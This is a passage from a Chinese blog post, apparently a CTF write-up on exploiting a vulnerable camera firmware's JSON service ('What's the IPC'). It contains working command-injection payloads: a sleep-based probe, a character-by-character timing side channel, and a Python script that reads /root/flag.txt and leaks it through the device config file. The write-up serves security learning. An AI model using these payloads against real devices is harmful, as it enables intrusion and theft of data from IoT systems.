+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">zer00ne@zer00ne:~/Desktop/ctf$ cat exp.py </span><br><span class="line">import json, re, socket</span><br><span class="line"></span><br><span class="line">HOST = &quot;nc1.ctfplus.cn&quot;</span><br><span class="line">PORT = 29897</span><br><span class="line"></span><br><span class="line">def udp(payload, timeout=30):</span><br><span class="line">    data = json.dumps(payload, separators=(&quot;,&quot;, &quot;:&quot;)).encode() + b&quot;\n&quot;</span><br><span class="line">    with socket.create_connection((HOST, PORT), timeout=timeout) as sock:</span><br><span class="line">        sock.sendall(data)</span><br><span class="line">        out = b&quot;&quot;</span><br><span class="line">        while True:</span><br><span class="line">            chunk = sock.recv(8192)</span><br><span class="line">            if not chunk:</span><br><span class="line">                break</span><br><span class="line">            out += chunk</span><br><span class="line">            if b&quot;\n&quot; in out:</span><br><span class="line">                break</span><br><span class="line">    return out.decode(errors=&quot;replace&quot;)</span><br><span class="line"></span><br><span class="line">def cmd(**param):</span><br><span class="line">    return udp(&#123;&quot;method&quot;: &quot;PTRfTxCali&quot;, &quot;param&quot;: param&#125;)</span><br><span class="line"></span><br><span class="line">cmd(mp_phypara=&quot;;sleep 3;&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>运行后大概3s获得响应, 由此判断命令注入存在</p>
+<h3 id="测信道攻击"><a href="#测信道攻击" class="headerlink" title="测信道攻击"></a>测信道攻击</h3><p>其实通过时间就能大概注入获得flag了</p>
+<p>具体的原理如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;[ &quot;$&#123;FLAG:0:1&#125;&quot; = &quot;N&quot; ]&amp;&amp;sleep 1;</span><br><span class="line">;[ &quot;$&#123;FLAG:1:1&#125;&quot; = &quot;e&quot; ]&amp;&amp;sleep 1;</span><br></pre></td></tr></table></figure>
+
+<p>对flag中的字符逐个比较, 稳定但很耗时</p>
+<h3 id="文件重定向"><a href="#文件重定向" class="headerlink" title="文件重定向"></a>文件重定向</h3><p>我选择的是这个方法</p>
+<p>我找到了一个接口<code>Tenda_mfg_htmlVersionInfo</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">v425 = sub_73840(v792, &quot;Tenda_mfg_htmlVersionInfo&quot;);</span><br><span class="line">sub_4A0D00(v792);</span><br><span class="line">if ( v425 )</span><br><span class="line">&#123;</span><br><span class="line">  s__1 = 0LL;</span><br><span class="line">  memset(v826, 0, 24);</span><br><span class="line">  sub_33769C(&amp;s__1, 32);</span><br><span class="line">  v426 = sub_171858(v584, &quot;param&quot;);</span><br><span class="line">  v427 = sub_171858(v426, &quot;PROD&quot;);</span><br><span class="line">  sub_7DA84(v793, &amp;s__1);</span><br><span class="line">  sub_16FF8C(v649, v793);</span><br><span class="line">  sub_170074(v427, v649);</span><br><span class="line">  sub_170C7A(v649);</span><br><span class="line">  sub_4A0D00(v793);</span><br><span class="line">  ptr__1 = 0LL;</span><br><span class="line">  memset(v829, 0, 56);</span><br><span class="line">  sub_33779C(&amp;ptr__1, 64);</span><br><span class="line">  v428 = sub_171858(v584, &quot;param&quot;);</span><br><span class="line">  v429 = sub_171858(v428, &quot;SV&quot;);</span><br><span class="line">  sub_7DA84(v794, &amp;ptr__1);</span><br><span class="line">  sub_16FF8C(v650, v794);</span><br><span class="line">  sub_170074(v429, v650);</span><br><span class="line">  sub_170C7A(v650);</span><br><span class="line">  sub_4A0D00(v794);</span><br><span class="line">  s_ = s__2;</span><br><span class="line">  v820 = 0;</span><br><span class="line">  s__2[0] = 0;</span><br><span class="line">  sub_7DA84(v795, &quot;mac_info&quot;);</span><br><span class="line">  sub_7EA34(a1, v795, &amp;s_);</span><br><span class="line">  sub_4A0D00(v795);</span><br><span class="line">  v430 = sub_171858(v584, &quot;param&quot;);</span><br><span class="line">  v431 = sub_171858(v430, &quot;MAC&quot;);</span><br><span class="line">  sub_16FF8C(v651, &amp;s_);</span><br><span class="line">  sub_170074(v431, v651);</span><br><span class="line">  sub_170C7A(v651);</span><br><span class="line">  sub_7DA84(v796, &quot;rf_test_flag&quot;);</span><br><span class="line">  sub_7EA34(a1, v796, &amp;s_);</span><br><span class="line">  sub_4A0D00(v796);</span><br><span class="line">  v432 = sub_171858(v584, &quot;param&quot;);</span><br><span class="line">  v433 = sub_171858(v432, &quot;RFTestFlag&quot;);</span><br><span class="line">  sub_16FF8C(v652, &amp;s_);</span><br><span class="line">  sub_170074(v433, v652);</span><br><span class="line">  sub_170C7A(v652);</span><br><span class="line">  sub_7DA84(v797, &quot;throughput_test_flag&quot;);</span><br><span class="line">  sub_7EA34(a1, v797, &amp;s_);</span><br><span class="line">  sub_4A0D00(v797);</span><br><span class="line">  v434 = sub_171858(v584, &quot;param&quot;);</span><br><span class="line">  v435 = sub_171858(v434, &quot;ThroughputTestFlag&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>这个接口会从文件<code>/opt/sav/Config/device.conf</code>中找到以下的键值对, 提取其中的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mac_info=xxx</span><br><span class="line">rf_test_flag=xxx</span><br><span class="line">throughput_test_flag=xxx</span><br><span class="line">finish_test_flag=xxx</span><br></pre></td></tr></table></figure>
+
+<p>放入响应中回显</p>
+<p>因此如果能把flag注入到mac_info&#x3D;$(flag), 就能通过这个接口获得flag</p>
+<p>可以使用如下的命令组合做到(测试了很多文件, 最终确定flag为&#x2F;root&#x2F;flag.txt)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmd(mp_phypara=&quot;;cat /root/flag.txt&gt;/tmp/f&quot;)</span><br><span class="line">cmd(mp_phypara=&quot;;sed -i s/^/mac_info=/ /tmp/f&quot;)</span><br><span class="line">cmd(mp_rate=&quot;;cp /tmp/f /opt/sav/Config/device.conf&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>最终获得的利用脚本为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import json, re, socket</span><br><span class="line"></span><br><span class="line">HOST = &quot;nc1.ctfplus.cn&quot;</span><br><span class="line">PORT = 39059</span><br><span class="line"></span><br><span class="line">def udp(payload, timeout=30):</span><br><span class="line">    data = json.dumps(payload, separators=(&quot;,&quot;, &quot;:&quot;)).encode() + b&quot;\n&quot;</span><br><span class="line">    with socket.create_connection((HOST, PORT), timeout=timeout) as sock:</span><br><span class="line">        sock.sendall(data)</span><br><span class="line">        out = b&quot;&quot;</span><br><span class="line">        while True:</span><br><span class="line">            chunk = sock.recv(8192)</span><br><span class="line">            if not chunk:</span><br><span class="line">                break</span><br><span class="line">            out += chunk</span><br><span class="line">            if b&quot;\n&quot; in out:</span><br><span class="line">                break</span><br><span class="line">    return out.decode(errors=&quot;replace&quot;)</span><br><span class="line"></span><br><span class="line">def cmd(**param):</span><br><span class="line">    return udp(&#123;&quot;method&quot;: &quot;PTRfTxCali&quot;, &quot;param&quot;: param&#125;)</span><br><span class="line"></span><br><span class="line">def mac():</span><br><span class="line">    resp = udp(&#123;&quot;method&quot;: &quot;Tenda_mfg_htmlVersionInfo&quot;, &quot;param&quot;: &#123;&#125;&#125;)</span><br><span class="line">    m = re.search(r&#x27;&quot;MAC&quot;:&quot;(.*?)&quot;&#x27;, resp)</span><br><span class="line">    return m.group(1).encode().decode(&quot;unicode_escape&quot;).strip()</span><br><span class="line"></span><br><span class="line">cmd(mp_phypara=&quot;;cat /root/flag.txt&gt;/tmp/f&quot;)</span><br><span class="line">cmd(mp_phypara=&quot;;sed -i s/^/mac_info=/ /tmp/f&quot;)</span><br><span class="line">cmd(mp_rate=&quot;;cp /tmp/f /opt/sav/Config/device.conf&quot;)</span><br><span class="line">print(mac())</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        <img data-src="/images/lm.jpg" data-sizes="auto" alt="Ezbuff" class="lazyload">
+      
+      <a href="/2026/03/25/SU_Ezbuff/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          Ezbuff
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2020-2026
+      
+      <span class="footer-info-sep rotate"></span>
+      zer00ne
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        73.3k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        05:44
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#nepctf-2026-What%E2%80%99s-the-IPC"><span class="toc-number">1.</span> <span class="toc-text">nepctf-2026-What’s the IPC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E5%8C%85-%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">解包+固件分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">逆向分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99"><span class="toc-number">1.3.</span> <span class="toc-text">脚本编写</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.1.</span> <span class="toc-text">测信道攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">1.3.2.</span> <span class="toc-text">文件重定向</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">26</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+  <script>
+    function initLive2d() {
+      live2d.init("https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/", {themeTipsPath: ""});
+    }
+  </script>
+  
+<script src="https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/js/live2d-autoload.js" onload="initLive2d &amp;&amp; initLive2d()" async></script>
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "zer00ne",
+          title: "nepctf What&#39;s the IPC",
+          url: "https://khighl.github.io.git/2026/08/21/nepctf_iot/",
+          excerpt: "",
+          description: "",
+          stripContent: "nepctf-2026-What’s the IPC解包+固件分析题目的描述很简答, 就说是一个有漏洞的摄像头 附件是一个.bin固件, 用binwalk就能解开 1binwalk -Me firmware.bin  可以在 1_firmware.bin-0.extracted/_romfs-x.squash.img.extracted/squashfs-root  中找到文件系统 因为这里指明了是摄像头, 所以可以快速去找Kylin文件 最终在./_user-x.squash.img.extr",
+          date: "Fri Aug 21 2026 00:00:00 GMT+0800",
+          updated: "Fri Aug 21 2026 10:06:46 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.8.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
